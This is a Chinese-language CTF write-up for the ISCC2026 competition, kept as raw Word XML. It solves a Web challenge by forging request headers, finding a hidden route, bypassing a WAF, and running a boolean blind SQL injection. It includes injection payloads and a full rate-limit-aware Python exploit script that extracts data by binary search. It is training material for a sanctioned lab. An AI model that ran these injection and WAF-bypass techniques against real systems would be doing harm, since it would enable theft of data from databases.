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ISCC2026 WriteUp</w:t>
      </w:r>
    </w:p>
    <w:p/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竞赛用户名：________    选手真实姓名：________    选手注册邮箱：________</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>题目类型+题目名称：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Web + 校园社团活动平台“活动”统计站</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>目标地址：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>http://39.105.213.28:8000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>考点：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>前端提示收集、请求头伪造、隐藏路由拼接、布尔盲注、简单 WAF 绕过</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>最终 FLAG：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>ISCC{Campus_Stat_A_7K!zY@w}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>解题思路（必须包含文字说明+截图）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. 首页观察，确定访问核心功能所需条件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访问首页后，页脚提示“访问核心功能需：用户代理+官方来源页+校园令牌”，说明后续访问核心页面需要同时满足 User-Agent、Referer 和校园令牌三个条件。首页 JS 中还存在 fetch('/?page=2', { method: 'GET' })，说明 page 参数是真实存在的入口，后续可以从该请求中继续寻找令牌。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curl -i http://39.105.213.28:8000/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【截图占位】首页页脚提示与前端 fetch("/?page=2") 代码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2. 读取 robots.txt 和 hint 文件，获得请求头要求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访问 robots.txt 发现允许访问 /static/hint/tech_stack.txt。继续访问该 hint 文件，可以得到后端为 Django 5.2.5，并明确要求核心接口必须使用指定 User-Agent 与 Referer。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curl -i http://39.105.213.28:8000/robots.txt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返回：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User-agent: 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Allow: /static/hint/tech_stack.txt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curl -i http://39.105.213.28:8000/static/hint/tech_stack.txt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关键内容：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User-Agent: Campus-Stat/1.0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Referer: https://campus-stat.example.com/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【截图占位】robots.txt 与 tech_stack.txt 中泄露的 User-Agent / Referer 要求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3. 通过 /?page=2 获取校园令牌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根据首页 JS 的提示请求 /?page=2，响应头中会多出 X-Campus-Token。至此可以拼出访问核心页面所需的完整请求头。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curl -i "http://39.105.213.28:8000/?page=2"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响应头关键字段：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X-Campus-Token: campus-ctf-2024-abc123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后续核心请求头：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User-Agent: Campus-Stat/1.0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Referer: https://campus-stat.example.com/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X-Campus-Token: campus-ctf-2024-abc123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【截图占位】/?page=2 响应头中的 X-Campus-Token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4. 访问隐藏线索页，收集语义 clue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带上三个请求头后，分别访问 /admin/、/stat/、/activity/。三个页面并不是最终入口，但会给出 admin/stat/activity 相关线索，其中 /activity/ 还泄露了 flag 前缀 ISCC{Campus_Stat_A_。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curl "http://39.105.213.28:8000/admin/"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-H "User-Agent: Campus-Stat/1.0"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-H "Referer: https://campus-stat.example.com/"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-H "X-Campus-Token: campus-ctf-2024-abc123"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/admin/    -&gt; flag{stat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/stat/     -&gt; Keyword: maybe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/activity/ -&gt; ISCC{Campus_Stat_A_ 以及 here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【截图占位】/admin/、/stat/、/activity/ 三个线索页的关键回显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5. 组合核心隐藏路由 /admin/stat/activity/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题目反复强调“管理：admin、统计：stat、活动：activity”三个语义词。将三个词按业务语义组合为 /admin/stat/activity/ 后可以进入真正的核心统计页面。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curl "http://39.105.213.28:8000/admin/stat/activity/"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-H "User-Agent: Campus-Stat/1.0"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-H "Referer: https://campus-stat.example.com/"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-H "X-Campus-Token: campus-ctf-2024-abc123"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【截图占位】核心统计页面中出现 dim_filter 参数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6. 定位注入点和后端 SQL 结构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核心页面源码中存在 GET 参数 dim_filter，并提示该参数会作为统计结果别名使用。页面还给出 SQL 结构 SELECT COUNT(*) AS [维度值] FROM activity，并在 HTML 注释中说明 Flag 存储在 flag 表的 value 字段，可通过构造条件判断字符是否正确。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&lt;input type="text" id="dim_filter" name="dim_filter" ...&gt;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SQL语句格式为SELECT COUNT(*) AS [维度值] FROM activity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Flag存储在flag表的value字段，可通过构造条件判断字符是否正确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WAF会过滤空格和完整关键词，可用/**/替代空格，简化关键词绕过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【截图占位】dim_filter 输入框、SQL 格式提示和 HTML 注释提示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7. 构造布尔盲注并绕过 WAF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题目给出了稳定的真假回显：条件为真时页面返回 ✅ 10，条件为假时返回 ✅ 0。因此可以对 flag.value 进行布尔盲注。由于 WAF 过滤空格和完整关键词，需要用 /**/ 替代空格，并使用大小写混淆关键字。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# 判断第一位是否为 I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substr((SeLeCt/**/value/**/FrOm/**/flag),1,1)='I'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True  -&gt; ✅ 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False -&gt; ✅ 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关键词和空格绕过：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SeLeCt/**/value/**/FrOm/**/flag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【截图占位】同一注入点中 True/False 分别返回 10/0 的对比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8. 使用二分盲注恢复 flag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EXP 中先二分判断 flag 长度，再对每一位字符的 unicode 值进行二分。与逐字符枚举相比，请求数更少，也更适合存在访问频率限制或网络抖动的环境。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# 长度判断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length((SeLeCt/**/value/**/FrOm/**/flag))&gt;mid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# 字符判断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unicode(substr((SeLeCt/**/value/**/FrOm/**/flag),pos,1))&gt;mid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center"/>
            <w:shd w:fill="FFF2CC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pPr>
              <w:spacing w:before="320" w:after="320"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
                <w:b/>
                <w:color w:val="805400"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>【截图占位】EXP 运行过程中显示长度、逐位字符与最终 FLAG</w:t>
              <w:br/>
              <w:t>提交前请替换为实际浏览器 / Burp / 终端截图。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9. 完整利用链总结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首页提示需要 User-Agent、Referer、校园令牌三个条件。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robots.txt 泄露 /static/hint/tech_stack.txt。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hint 文件给出 User-Agent: Campus-Stat/1.0 和 Referer: https://campus-stat.example.com/。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/?page=2 响应头给出 X-Campus-Token: campus-ctf-2024-abc123。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/admin/、/stat/、/activity/ 给出 admin/stat/activity 语义线索与 flag 前缀。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组合出核心路由 /admin/stat/activity/。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核心页面暴露 dim_filter 注入点、flag 表和 value 字段。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通过 /**/ 与大小写混淆绕过 WAF，使用布尔盲注恢复 flag。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>最终 FLAG：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>ISCC{Campus_Stat_A_7K!zY@w}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Exp（如有，请粘贴完整代码，不允许截图！）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:line="276" w:lineRule="auto" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>运行方式：python C:\tmp\ISCC2\WEB\3\exp.py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vAlign w:val="top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import itertools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import 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import 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import random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from typing import Optional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import requests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BASE = "http://39.105.213.28:8000"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UA_FALLBACK = "Campus-Stat/1.0"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REFERER_FALLBACK = "https://campus-stat.example.com/"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TOKEN_FALLBACK = "campus-ctf-2024-abc123"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# 基础请求间隔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REQUEST_DELAY = 2.0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# 已知的flag前缀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KNOWN_PREFIX = "ISCC{Campus_Stat_A_"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class Solver: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__init__(self):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self.s = requests.Session()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self.ua = UA_FALLBACK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self.referer = REFERER_FALLBACK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self.token = TOKEN_FALLBACK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self.core_path: Optional[str] = None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self.last_request_time = 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self.consecutive_429 = 0  # 连续429计数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_rate_limit(self):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"""智能限速：根据是否触发429动态调整"""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now = time.time()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elapsed = now - self.last_request_time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根据连续429次数动态增加等待时间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dynamic_delay = REQUEST_DELAY + (self.consecutive_429 * 2)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if elapsed &lt; dynamic_delay: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sleep_time = dynamic_delay - elapsed + random.uniform(0.3, 0.7)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time.sleep(sleep_time)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# 正常情况加少量随机延迟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time.sleep(random.uniform(0.5, 1.0))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self.last_request_time = time.time()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_request(self, method: str, path: str, *, headers=None, params=None, timeout=15, retries=3):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last_exception = None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for i in range(retries):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self._rate_limit()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r = self.s.request(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method,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f"{BASE}{path}",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headers=headers,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params=params,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timeout=timeout,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if r.status_code == 429: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self.consecutive_429 +=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wait = 15 * self.consecutive_429  # 递增等待时间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print(f"[!] 429 hit (x{self.consecutive_429}), waiting {wait}s...")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time.sleep(wait)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continue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# 成功请求，重置429计数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self.consecutive_429 = max(0, self.consecutive_429 - 1)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r.raise_for_status()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return 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except requests.exceptions.HTTPError as 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if e.response is not None and e.response.status_code == 429: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self.consecutive_429 +=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wait = 15 * self.consecutive_429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print(f"[!] 429 hit (x{self.consecutive_429}), waiting {wait}s...")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time.sleep(wait)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continue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last_exception = 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time.sleep(2 + i)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except Exception as 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last_exception = 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time.sleep(2 + i)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确保抛出正确的异常对象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if isinstance(last_exception, Exception):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raise last_exception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raise RuntimeError(f"Request failed after {retries} retries")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_core_headers(self):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"User-Agent": self.ua,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"Referer": self.referer,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"X-Campus-Token": self.token,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bootstrap(self):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robots = self._request("GET", "/robots.txt", timeout=10)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if "/static/hint/tech_stack.txt" in robots.text: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hint = self._request("GET", "/static/hint/tech_stack.txt", timeout=10)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m = re.search(r'User-Agent: Must strictly follow "([^"]+)"', hint.text)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if m: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self.ua = m.group(1)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if "campus-stat.example.com" in hint.text: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self.referer = "https://campus-stat.example.com/"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 = self._request("GET", "/", params={"page": "2"}, timeout=10)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self.token = r.headers.get("X-Campus-Token", self.token)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collect_clues(self):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headers = self._core_headers()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admin = self._request("GET", "/admin/", headers=headers, timeout=10).text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stat = self._request("GET", "/stat/", headers=headers, timeout=10).text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activity = self._request("GET", "/activity/", headers=headers, timeout=10).text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clue_admin = re.search(r"flag\{([A-Za-z0-9_]+)", admin)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clue_stat = re.search(r'Keyword:\s*&lt;span class="keyword"&gt;([^&lt;]+)&lt;/span&gt;', stat)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clue_prefix = re.search(r"ISCC\{Campus_Stat_A_", activity)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clue_here = re.search(r'&lt;div class="here"&gt;([^&lt;]+)&lt;/div&gt;', activity)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print("[+] clue /admin/   =", clue_admin.group(1) if clue_admin else "N/A")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print("[+] clue /stat/    =", clue_stat.group(1) if clue_stat else "N/A")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print("[+] clue /activity =", clue_here.group(1) if clue_here else "N/A")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print("[+] prefix         =", clue_prefix.group(0) if clue_prefix else "N/A")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find_core_path(self):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headers = self._core_headers()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segments = ["admin", "stat", "activity"]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candidates = ["/admin/stat/activity/"] +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"/" + "/".join(p) + "/" for p in itertools.permutations(segments) if p != ("admin", "stat", "activity")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for path in candidates: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r = self._request("GET", path, headers=headers, timeout=15, retries=2)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text = r.text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if "dim_filter" in text and "COUNT(" in text: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self.core_path = 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print(f"[+] core path found: {path}")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return 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except Exception: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continue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raise RuntimeError("[-] core path not found")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query_true(self, expr: str) -&gt; bool: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if not self.core_path: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raise RuntimeError("core path not initialized")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headers = self._core_headers()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max_retries = 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for attempt in range(max_retries):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r = self._request(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"GET",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self.core_path,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headers=headers,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params={"dim_filter": expr},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timeout=20,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retries=3,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text = r.text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if "✅ 10" in text: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return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if "✅ 0" in text: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return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m = re.search(r'&lt;div class="count"&gt;\s*.*?(\d+)\s*&lt;/div&gt;', text, re.S)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if m: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return m.group(1) == "10"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print(f"[!] unexpected response, retrying... ({attempt + 1})")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time.sleep(3)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except Exception as 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print(f"[!] request failed: {e}, retrying... ({attempt + 1})")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time.sleep(5)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raise RuntimeError("[-] unable to parse boolean result after multiple retries")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find_length(self, upper=80) -&gt; int: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"""二分查找flag长度"""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lo, hi = 1, upper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while lo &lt; hi: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mid = (lo + hi) // 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expr = f"length((SeLeCt/**/value/**/FrOm/**/flag))&gt;{mid}"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if self.query_true(expr):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lo = mid + 1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hi = mid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验证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expr = f"length((SeLeCt/**/value/**/FrOm/**/flag))={lo}"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if not self.query_true(expr):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raise RuntimeError("[-] flag length verification failed")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print(f"[+] flag length = {lo}")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return lo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leak_char(self, pos: int)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"""优化字符提取：先判断字符类型来减少二分次数"""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常见的flag字符集：数字、小写字母、大写字母、下划线、花括号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char_classes =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(48, 57, "digits"),  # 0-9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(65, 90, "uppercase"),  # A-Z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(97, 122, "lowercase"),  # a-z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(95, 95, "underscore"),  # _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(123, 125, "braces"),  #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先快速判断字符类型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char_type_found = False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lo, hi = 32, 126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for c_lo, c_hi, type_name in char_classes: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# 测试字符是否大于等于这个范围的下限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expr_ge = f"unicode(substr((SeLeCt/**/value/**/FrOm/**/flag),{pos},1))&gt;={c_lo}"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if self.query_true(expr_ge):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# 测试字符是否小于等于这个范围的上限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expr_le = f"unicode(substr((SeLeCt/**/value/**/FrOm/**/flag),{pos},1))&lt;={c_hi}"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if self.query_true(expr_le):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print(f"[*] pos {pos}: detected {type_name}")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lo, hi = c_lo, c_hi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char_type_found =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    break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在确定的范围内二分查找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while lo &lt; hi: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mid = (lo + hi) // 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expr = f"unicode(substr((SeLeCt/**/value/**/FrOm/**/flag),{pos},1))&gt;{mid}"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if self.query_true(expr):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lo = mid + 1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hi = mid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验证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expr = f"unicode(substr((SeLeCt/**/value/**/FrOm/**/flag),{pos},1))={lo}"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if not self.query_true(expr):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raise RuntimeError(f"[-] character verification failed at position {pos}")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ch = chr(lo)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print(f"[+] pos {pos}: found '{ch}' (ASCII {lo})")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return ch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def leak_flag(self) -&gt; str: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length = self.find_length()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先填充已知前缀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known_chars = list(KNOWN_PREFIX)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out = known_chars[:]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print(f"[+] using known prefix: {KNOWN_PREFIX} ({len(KNOWN_PREFIX)} chars)")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# 从已知前缀之后开始爆破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start_pos = len(KNOWN_PREFIX) + 1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if start_pos &lt;= length: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print(f"[*] starting extraction from position {start_pos}...")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print(f"[*] remaining characters: {length - start_pos + 1}")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for pos in range(start_pos, length + 1):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ch = self.leak_char(pos)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out.append(ch)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# 显示完整进度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current_flag = "".join(out)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remaining = length - pos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    print(f"[+] progress: {current_flag} (remaining: {remaining})")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    print("[+] flag already complete with known prefix!")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    return "".join(out)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def main():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solver = Solver()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print("[*] bootstrap...")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solver.bootstrap()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print("[+] UA      =", solver.ua)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print("[+] Referer =", solver.referer)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print("[+] Token   =", solver.token)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print("[*] collecting clue pages...")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solver.collect_clues()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print("[*] locating core statistics page...")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solver.find_core_path()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print("[*] blind SQLi extracting flag...")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print(f"[*] known prefix: {KNOWN_PREFIX}")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print(f"[*] skipping first {len(KNOWN_PREFIX)} characters")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flag = solver.leak_flag()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print(f"\n[+] FLAG = {flag}")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print(f"[+] Flag length: {len(flag)}")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sz w:val="15"/>
              </w:rPr>
              <w:t xml:space="preserve">    main()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